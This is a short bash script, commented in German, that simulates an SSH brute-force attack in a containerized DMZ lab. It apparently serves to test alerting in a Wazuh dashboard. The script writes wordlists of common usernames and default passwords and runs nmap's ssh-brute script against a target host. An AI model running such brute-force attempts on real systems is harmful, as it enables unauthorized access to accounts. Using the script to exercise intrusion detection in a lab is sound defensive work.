#!/bin/bash
# Angriffsszenario 1: SSH Brute Force Angriff
# Simuliert einen Brute-Force-Angriff auf SSH-Dienste

echo "=== SSH Brute Force Angriff Szenario ==="
echo "Dieser Angriff simuliert mehrere fehlgeschlagene SSH-Login-Versuche"
echo ""

TARGET_HOST="${1:-webserver}"
ATTACKER="${2:-attacker-internet}"

echo "[+] Starte SSH Brute Force von $ATTACKER gegen $TARGET_HOST"

# Simuliere mehrere fehlgeschlagene Login-Versuche
# Erstelle temporäre Wortlisten im Container
sudo docker exec clab-dmz-project-sun-$ATTACKER bash -c "echo -e 'admin\nroot\nuser\ntest\nadministrator\nguest\noracle\npostgres\nmysql' > /tmp/users.txt"
sudo docker exec clab-dmz-project-sun-$ATTACKER bash -c "echo -e 'password\n123456\nadmin\nroot\ntest\npassword123\nadmin123' > /tmp/pass.txt"

echo "[*] Führe Nmap SSH Brute Force aus..."
sudo docker exec clab-dmz-project-sun-$ATTACKER \
    nmap -p 22 --script ssh-brute --script-args userdb=/tmp/users.txt,passdb=/tmp/pass.txt \
    --script-args ssh-brute.timeout=2s \
    $TARGET_HOST

# Aufräumen
sudo docker exec clab-dmz-project-sun-$ATTACKER rm /tmp/users.txt /tmp/pass.txt

echo ""
echo "[+] Brute Force Angriff abgeschlossen"
echo "[+] Überprüfe Wazuh Dashboard für Alerts: https://localhost:8443"
echo "[+] Suche nach: 'authentication failed' oder 'brute force'"
